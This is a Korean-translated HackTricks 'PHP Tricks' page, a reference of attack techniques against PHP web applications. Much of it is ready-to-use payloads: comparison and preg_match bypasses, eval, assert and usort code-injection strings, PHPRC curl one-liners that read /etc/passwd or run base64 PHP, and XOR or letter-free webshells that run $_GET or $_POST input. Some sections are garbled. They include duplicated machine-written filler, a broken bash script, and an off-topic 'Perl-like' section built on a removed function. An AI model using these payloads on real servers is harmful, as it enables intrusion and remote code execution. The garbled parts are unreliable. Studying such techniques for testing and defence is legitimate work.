# PHP 트릭

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 쿠키의 일반적인 위치:

이는 phpMyAdmin 쿠키에도 적용됩니다.

쿠키:
```
PHPSESSID
phpMyAdmin
```
위치:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP 비교 우회하기

### 느슨한 비교/타입 캐스팅 ( == )

PHP에서 `==`를 사용하면 예상치 못한 경우에 비교가 예상대로 작동하지 않을 수 있습니다. 이는 "=="가 값이 동일한 유형으로 변환된 것만 비교하기 때문입니다. 비교하는 데이터의 유형도 동일한지 비교하려면 `===`를 사용해야 합니다.

PHP 비교 테이블: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` 숫자로 시작하지 않는 문자열은 숫자와 같습니다.
* `"0xAAAA" == "43690" -> True` 10진수 또는 16진수 형식의 숫자로 구성된 문자열은 동일한 숫자/문자열과 비교하여 True가 될 수 있습니다 (문자열 내의 숫자는 숫자로 해석됩니다).
* `"0e3264578" == 0 --> True` "0e"로 시작하고 그 뒤에 아무 문자열이 오는 문자열은 0과 같습니다.
* `"0X3264578" == 0X --> True` "0"으로 시작하고 그 뒤에 임의의 문자 (X는 임의의 문자일 수 있음)와 그 뒤에 아무 문자열이 오는 문자열은 0과 같습니다.
* `"0e12334" == "0" --> True` 이것은 매우 흥미로운 사례입니다. 경우에 따라 "0"으로 시작하고 어떤 내용이 해시되어 비교되는 문자열 입력과 해시된 문자열을 제공할 수 있습니다. 따라서 "0e"로 시작하고 어떤 문자도 없는 해시를 생성할 수 있는 값을 제공할 수 있다면 비교를 우회할 수 있습니다. 이 형식의 **이미 해시된 문자열**을 여기에서 찾을 수 있습니다: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` 문자열 내의 어떤 문자도 정수 0과 같습니다.

자세한 내용은 [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)에서 확인할 수 있습니다.

### **in\_array()**

**타입 캐스팅**은 기본적으로 `in_array()` 함수에도 영향을 미칩니다 (엄격한 비교를 하려면 세 번째 인자를 true로 설정해야 함):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

이 함수가 **인증 확인** (예: 비밀번호 확인)에 사용되고 사용자가 비교의 한 쪽을 제어하는 경우, 사용자는 비밀번호 값으로 빈 배열을 보낼 수 있으며 (`https://example.com/login.php/?username=admin&password[]=`), 이 확인을 우회할 수 있습니다:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()`에서도 동일한 오류가 발생합니다.

### 엄격한 타입 강제 변환

`===`를 사용하더라도 **타입 강제 변환에 취약한 비교** 오류가 발생할 수 있습니다. 예를 들어, 비교가 **데이터를 비교하기 전에 다른 유형의 객체로 변환**하는 경우:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`**는 **사용자 입력을 유효성 검사**하는 데 사용될 수 있습니다. (사용자 입력에서 블랙리스트에 있는 단어/정규식이 있는지 확인하고, 없다면 코드는 계속 실행될 수 있습니다).

#### 개행 문자 우회

그러나, 정규식의 시작을 구분할 때 `preg_match()`는 **사용자 입력의 첫 번째 줄만 확인**합니다. 그래서 어떻게든 **여러 줄로 입력**을 보낼 수 있다면, 이 검사를 우회할 수 있습니다. 예시:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
이 체크를 우회하기 위해 **값을 새 줄로 인코딩된 URL로 보낼 수 있습니다** (`%0A`) 또는 **JSON 데이터**를 보낼 수 있다면 **여러 줄에 걸쳐 보내십시오**:
```php
{
"cmd": "cat /etc/passwd"
}
```
다음은 예제입니다: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **길이 오류 우회**

(이 우회는 PHP 5.2.5에서 시도되었으며 PHP 7.3.15에서는 작동하지 않았습니다)\
`preg_match()`에 유효한 매우 **큰 입력**을 보낼 수 있다면, 그것은 **처리할 수 없게** 되고 체크를 **우회**할 수 있습니다. 예를 들어, JSON을 블랙리스트로 설정하고 있다면 다음과 같이 보낼 수 있습니다:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS 우회

트릭 출처: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

간단히 말해서 문제는 PHP의 `preg_*` 함수가 [PCRE 라이브러리](http://www.pcre.org/)를 기반으로 한다는 점에서 발생합니다. PCRE에서는 일부 정규식이 많은 재귀 호출을 사용하여 일치시킵니다. 이는 많은 스택 공간을 사용합니다. 재귀 호출 횟수에 제한을 설정할 수 있지만, PHP에서는 이 제한이 [기본적으로 100,000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)으로 설정되어 있으며, 이는 스택에 맞지 않는 값입니다.

[이 Stackoverflow 스레드](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error)도 이 문제에 대해 더 자세히 설명되어 있는 게시물에 링크되어 있습니다. 우리의 작업은 이제 명확해졌습니다:\
**100,000회 이상의 재귀를 수행하는 정규식을 만들어 입력하고, SIGSEGV를 발생시켜 `preg_match()` 함수가 `false`를 반환하도록 만들어 응용 프로그램이 우리의 입력이 악성이 아니라고 생각하게 하고, 페이로드의 끝에 `{system(<verybadcommand>)}`와 같은 것을 추가하여 SSTI --> RCE --> 플래그를 얻습니다 :)**.

실제로는 정규식에서 100,000회의 "재귀"를 수행하는 것이 아니라 "백트래킹 단계"를 세는 것입니다. [PHP 문서](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)에 따르면, 이 값은 `pcre.backtrack_limit` 변수에서 기본적으로 1,000,000 (1백만)으로 설정됩니다.\
이를 달성하기 위해 `'X'*500_001`을 사용하면 백트래킹 단계가 1백만(50만은 앞으로, 50만은 뒤로)이 됩니다:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP 난독화를 위한 타입 캐스팅

Type juggling is a technique used in PHP to perform implicit type conversions. It can also be used for obfuscation purposes, making the code harder to understand and analyze. 

타입 캐스팅은 PHP에서 암묵적인 타입 변환을 수행하기 위해 사용되는 기술입니다. 이는 코드를 이해하고 분석하기 어렵게 만들어 난독화 목적으로도 사용될 수 있습니다.

In PHP, variables do not have a fixed type. They can hold values of different types, and PHP will automatically convert the variable's type based on the context in which it is used. This behavior can be exploited to perform type juggling attacks.

PHP에서 변수는 고정된 타입을 가지지 않습니다. 변수는 다른 타입의 값을 저장할 수 있으며, PHP는 변수의 타입을 자동으로 변환합니다. 이 동작은 타입 캐스팅 공격을 수행하기 위해 악용될 수 있습니다.

Type juggling attacks involve manipulating the type of a variable to bypass certain checks or comparisons. For example, a string that starts with a numeric value may be treated as a number in certain operations, leading to unexpected behavior.

타입 캐스팅 공격은 변수의 타입을 조작하여 특정 검사나 비교를 우회하는 것을 포함합니다. 예를 들어, 숫자로 시작하는 문자열은 특정 연산에서 숫자로 처리될 수 있어 예상치 못한 동작을 유발할 수 있습니다.

To perform type juggling attacks, you need to understand how PHP performs type conversions. PHP uses loose typing, meaning it will attempt to convert variables to the most appropriate type for the operation being performed. This can lead to unexpected results if not handled carefully.

타입 캐스팅 공격을 수행하기 위해서는 PHP가 타입 변환을 어떻게 수행하는지 이해해야 합니다. PHP는 느슨한 타이핑을 사용하므로, 수행 중인 작업에 가장 적합한 타입으로 변수를 변환하려고 합니다. 이를 신중하게 처리하지 않으면 예상치 못한 결과가 발생할 수 있습니다.

Type juggling attacks can be used to bypass input validation, perform SQL injection, or exploit other vulnerabilities in PHP applications. It is important for developers and security professionals to be aware of this technique and implement proper input validation and sanitization to prevent such attacks.

타입 캐스팅 공격은 입력 유효성 검사 우회, SQL 인젝션 수행 또는 PHP 애플리케이션의 다른 취약점을 악용하는 데 사용될 수 있습니다. 개발자와 보안 전문가는 이 기술을 인식하고 적절한 입력 유효성 검사와 살균을 구현하여 이러한 공격을 방지하는 것이 중요합니다.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## 리디렉션 후 실행 (EAR)

PHP가 다른 페이지로 리디렉션하지만 **`die`** 또는 **`exit`** 함수가 **`Location`** 헤더가 설정된 후에 호출되지 않으면, PHP는 계속 실행되고 데이터를 본문에 추가합니다:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## 더 많은 트릭

* **register\_globals**: **PHP < 4.1.1.1** 버전에서 또는 잘못 구성된 경우, **register\_globals**가 활성화될 수 있습니다 (또는 그들의 동작이 모방됩니다). 이는 전역 변수인 $\_GET과 같은 변수에서 값이 있다면 예를 들어 $\_GET\["param"]="1234"라면, **$param을 통해 해당 값을 액세스할 수 있습니다. 따라서 HTTP 매개변수를 보내면 코드 내에서 사용되는 변수를 덮어쓸 수 있습니다**.
* **같은 도메인의 PHPSESSION 쿠키는 동일한 위치에 저장**됩니다. 따라서 도메인 내에서 **다른 경로에서 다른 쿠키를 사용**하는 경우, 한 경로가 다른 경로의 쿠키에 액세스하도록 만들 수 있습니다.\
이렇게 하면 **두 경로가 동일한 이름을 가진 변수에 액세스**할 수 있으며, 이를 통해 path1의 변수 값이 path2에 적용되도록 할 수 있습니다. 그리고 그런 다음 path2는 path1의 변수를 유효한 값으로 간주합니다 (path2에서 해당 변수에 해당하는 이름의 쿠키를 제공함으로써).
* 기계 사용자의 **사용자 이름**을 가지고 있는 경우. 주소를 확인하십시오: **/\~\<USERNAME>**, PHP 디렉토리가 활성화되어 있는지 확인하려면.
* [**php 래퍼를 사용한 LFI 및 RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

이 함수들은 일반적으로 PHP에서 **비밀번호로부터 해시를 생성**하고 해시와 비교하여 비밀번호가 올바른지 확인하는 데 사용됩니다.\
지원되는 알고리즘은 `PASSWORD_DEFAULT`와 `PASSWORD_BCRYPT`(`$2y$`로 시작)입니다. **PASSWORD\_DEFAULT는 일반적으로 PASSWORD\_BCRYPT와 동일**합니다. 그리고 현재 **PASSWORD\_BCRYPT**는 입력의 크기에 제한이 있어 72바이트보다 큰 것을 이 알고리즘으로 해시하려고 할 때는 처음 72바이트만 사용됩니다:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP 헤더 우회를 이용한 PHP 오류 악용

만약 **PHP 페이지가 오류를 출력하고 사용자가 제공한 일부 입력을 에코하는 경우**, 사용자는 PHP 서버가 일부 **충분히 긴 내용을 출력하도록**하여 서버가 응답에 **헤더를 추가하려고 할 때 오류를 발생시킬 수 있습니다**.\
다음 시나리오에서 **공격자는 서버가 큰 오류를 발생하도록 만들었으며**, 화면에서 볼 수 있듯이 PHP가 **헤더 정보를 수정하려고 할 때 실패**했습니다 (예: CSP 헤더가 사용자에게 전송되지 않음):

![](<../../../.gitbook/assets/image (465).png>)

## 코드 실행

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[더 많은 유용한 PHP 함수는 여기를 확인하세요](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" 인자의 코드를 실행하기 위해서는 적어도 하나의 일치가 필요합니다.\
이 preg\_replace 옵션은 **PHP 5.5.0부터 사용이 중지되었습니다.**

### **Eval()을 통한 RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert()를 통한 RCE**

php 내의 이 함수는 **문자열로 작성된 코드를 실행**하여 **true 또는 false를 반환**하여 실행을 변경할 수 있게 해줍니다. 일반적으로 사용자 변수는 문자열 중간에 삽입됩니다. 예를 들어:\
`assert("strpos($_GET['page']),'..') === false")` --> 이 경우 **RCE**를 얻으려면 다음을 수행할 수 있습니다:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
코드 구문을 **깨뜨리고**, **페이로드**를 **추가**한 다음 다시 **고치는** 작업이 필요합니다. "**and" 또는 "%26%26" 또는 "|"**와 같은 **논리 연산**을 사용할 수 있습니다. "or", "||"는 첫 번째 조건이 참이면 페이로드가 실행되지 않기 때문에 작동하지 않습니다. 마찬가지로 ";"도 작동하지 않으므로 페이로드가 실행되지 않습니다.

**다른 옵션**은 명령어 실행을 문자열에 추가하는 것입니다: `'.highlight_file('.passwd').'`

**다른 옵션** (내부 코드를 가지고 있는 경우)은 실행을 변경하기 위해 일부 변수를 수정하는 것입니다: `$file = "hola"`

### **usort()를 통한 RCE**

이 함수는 특정 함수를 사용하여 항목의 배열을 정렬하는 데 사용됩니다.\
이 함수를 악용하기 위해서는 다음과 같이 할 수 있습니다:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**//**을 사용하여 코드의 나머지 부분을 주석 처리할 수도 있습니다.

닫아야 할 괄호의 수를 알아내려면 다음을 사용할 수 있습니다:

* `?order=id;}//`: 오류 메시지를 받습니다 (`Parse error: syntax error, unexpected ';'`). 아마도 하나 이상의 괄호가 누락된 것 같습니다.
* `?order=id);}//`: 경고 메시지를 받습니다. 이게 맞는 것 같습니다.
* `?order=id));}//`: 오류 메시지를 받습니다 (`Parse error: syntax error, unexpected ')' i`). 아마도 닫는 괄호가 너무 많은 것 같습니다.

### **.httaccess를 통한 RCE**

**.htaccess**를 **업로드**할 수 있다면, 여러 가지를 **구성**하고 코드를 실행할 수도 있습니다 (확장자가 .htaccess인 파일을 **실행**할 수 있도록 구성).

다양한 .htaccess 쉘은 [여기](https://github.com/wireghoul/htshells)에서 찾을 수 있습니다.

### Env 변수를 통한 RCE

PHP에서 **env 변수를 수정**할 수 있는 취약점을 찾았다면 (또 다른 파일 업로드 취약점도 있어야 하지만 추가 연구로 이를 우회할 수 있을 수도 있음), 이 동작을 악용하여 **RCE**를 얻을 수 있습니다.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): 이 env 변수는 다른 이진 파일을 실행할 때 임의의 라이브러리를 로드할 수 있게 합니다 (이 경우에는 작동하지 않을 수도 있음).
* **`PHPRC`** : PHP에게 **구성 파일인 `php.ini`를 찾을 위치**를 지시합니다. 자체 구성 파일을 업로드할 수 있다면, `PHPRC`를 사용하여 PHP를 가리킬 수 있습니다. **`auto_prepend_file`** 항목을 추가하여 두 번째 업로드한 파일을 지정합니다. 이 두 번째 파일에는 일반적인 **PHP 코드가 포함**되어 있으며, 이 코드는 다른 코드보다 먼저 PHP 런타임에 의해 실행됩니다.
1. 쉘코드가 포함된 PHP 파일을 업로드합니다.
2. 두 번째 파일을 업로드하고, **`auto_prepend_file`** 지시문을 사용하여 PHP 전처리기에게 1단계에서 업로드한 파일을 실행하도록 지시합니다.
3. `PHPRC` 변수를 2단계에서 업로드한 파일로 설정합니다.
* 이 체인을 실행하는 방법에 대한 자세한 정보는 [**원본 보고서**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)를 참조하십시오.
* **PHPRC** - 다른 옵션
* 파일을 **업로드할 수 없는 경우**, FreeBSD에서 "file" `/dev/fd/0`를 사용할 수 있습니다. 이 파일은 요청의 **`stdin`인 본문**을 포함합니다:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* 또는 RCE를 얻으려면 **`allow_url_include`**를 활성화하고 **base64 PHP 코드**로 파일을 선행합니다:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* 기술은 [**이 보고서**](https://vulncheck.com/blog/juniper-cve-2023-36845)에서 가져왔습니다.

## PHP 정적 분석

이 함수들에 코드를 삽입할 수 있는지 확인하세요 ([여기](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)에서 가져옴):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
만약 PHP 애플리케이션을 디버깅하고 있다면, `/etc/php5/apache2/php.ini`에 `display_errors = On`을 추가하여 오류 출력을 전역적으로 활성화할 수 있으며, 아파치를 재시작해야 합니다: `sudo systemctl restart apache2`

### PHP 코드의 해독

PHP 코드를 해독하기 위해 **웹**[ **www.unphp.net**](http://www.unphp.net) **을 사용할 수 있습니다.**

## PHP 래퍼 및 프로토콜

PHP 래퍼와 프로토콜은 시스템에서의 쓰기 및 읽기 보호를 우회하고 시스템을 침해할 수 있게 해줄 수 있습니다. [**더 많은 정보는 이 페이지를 확인하세요**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug 인증되지 않은 RCE

`phpconfig()` 출력에서 **Xdebug**가 **활성화**되어 있는 것을 확인하면 [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)을 통해 RCE를 시도해야 합니다.

## 변수 변수
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE를 이용한 새로운 $\_GET\["a"]\($\_GET\["b"])의 남용

만약 페이지에서 **임의의 클래스의 새로운 객체를 생성**할 수 있다면, RCE를 얻을 수도 있습니다. 다음 페이지를 확인하여 자세한 내용을 알아보세요:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## 문자 없이 PHP 실행하기

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### 8진수 사용하기
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR)는 두 개의 입력 비트가 다를 때만 1을 출력하는 논리 연산자입니다. XOR은 암호화와 해독에 널리 사용되는 중요한 연산입니다. XOR 연산은 비트 단위로 수행되며, 입력 값과 XOR 연산을 수행한 결과를 출력합니다.

XOR 연산은 다음과 같은 특징을 가지고 있습니다:

- 두 개의 입력 값이 같으면 출력 값은 0이 됩니다.
- 두 개의 입력 값이 다르면 출력 값은 1이 됩니다.

XOR 연산은 암호화에서 키 생성과 데이터 암호화에 사용됩니다. XOR 연산을 사용하여 데이터를 암호화하면, 같은 키를 사용하여 다시 XOR 연산을 수행하면 원래 데이터를 복원할 수 있습니다.

XOR 연산은 간단하면서도 효과적인 암호화 기법 중 하나입니다. 그러나 단일 XOR 연산만으로는 안전한 암호화를 보장할 수 없으므로, 다른 암호화 기법과 함께 사용되어야 합니다.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR 쉘 코드

[**이 writeup**](https://mgp25.com/ctf/Web-challenge/)에 따르면 다음과 같이 간단한 쉘 코드를 생성할 수 있습니다:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
그래서, **숫자와 문자 없이 임의의 PHP를 실행**할 수 있다면 다음과 같은 요청을 보낼 수 있습니다. 해당 페이로드를 남용하여 임의의 PHP를 실행합니다:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
더 자세한 설명은 [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)를 확인하세요.

### XOR 쉘코드 (eval 내부)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl과 유사한 기능

Perl은 강력한 스크립팅 언어로, 다양한 기능을 제공합니다. PHP에서도 Perl과 유사한 기능을 구현할 수 있습니다. 이 섹션에서는 몇 가지 유용한 Perl 기능을 PHP에서 사용하는 방법을 알아보겠습니다.

#### 정규 표현식

Perl은 정규 표현식을 지원하여 문자열 패턴 매칭에 유용합니다. PHP에서도 Perl과 유사한 정규 표현식을 사용할 수 있습니다. 예를 들어, `preg_match()` 함수를 사용하여 문자열에서 패턴을 찾을 수 있습니다.

```php
$pattern = '/\b(\w+)\b/';
$string = "Hello, world!";
if (preg_match($pattern, $string, $matches)) {
    echo "매치된 패턴: " . $matches[0];
} else {
    echo "패턴을 찾을 수 없습니다.";
}
```

#### 파일 처리

Perl은 파일을 쉽게 처리할 수 있는 기능을 제공합니다. PHP에서도 Perl과 유사한 파일 처리 기능을 사용할 수 있습니다. 예를 들어, `file_get_contents()` 함수를 사용하여 파일의 내용을 읽을 수 있습니다.

```php
$file = 'example.txt';
if (file_exists($file)) {
    $content = file_get_contents($file);
    echo $content;
} else {
    echo "파일을 찾을 수 없습니다.";
}
```

#### 문자열 조작

Perl은 강력한 문자열 조작 기능을 제공합니다. PHP에서도 Perl과 유사한 문자열 조작 기능을 사용할 수 있습니다. 예를 들어, `substr()` 함수를 사용하여 문자열의 일부분을 추출할 수 있습니다.

```php
$string = "Hello, world!";
$substring = substr($string, 0, 5);
echo $substring;
```

#### 기타 기능

Perl은 다양한 기능을 제공하며, PHP에서도 Perl과 유사한 기능을 구현할 수 있습니다. 예를 들어, `split()` 함수를 사용하여 문자열을 분할할 수 있습니다.

```php
$string = "Hello,world!";
$parts = split(',', $string);
print_r($parts);
```

이처럼 PHP에서 Perl과 유사한 기능을 사용하여 더 효율적이고 강력한 코드를 작성할 수 있습니다.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
